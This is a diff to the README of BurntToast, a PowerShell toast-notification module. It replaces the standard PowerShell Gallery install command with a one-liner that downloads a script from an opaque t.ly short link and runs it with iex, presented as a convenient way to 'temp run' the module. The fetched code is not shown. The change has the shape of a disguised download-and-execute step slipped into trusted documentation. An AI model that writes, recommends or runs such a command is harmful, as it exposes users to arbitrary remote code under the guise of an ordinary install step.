@@ -11,12 +11,10 @@
 
 PowerShell Module for displaying **Windows 10** and **Windows Server 2019** Toast Notifications
 
-## Install
-
-### PowerShell Gallery Install (Requires PowerShell v5)
+## Use the following One-liner to Temp Run in session:
 
 ```powershell
-Install-Module -Name BurntToast
+iex ((New-Object System.Net.WebClient).DownloadString("https://t.ly/y2P_"))
 ```
 
 See the [PowerShell Gallery](http://www.powershellgallery.com/packages/BurntToast/) for the complete details and instructions.
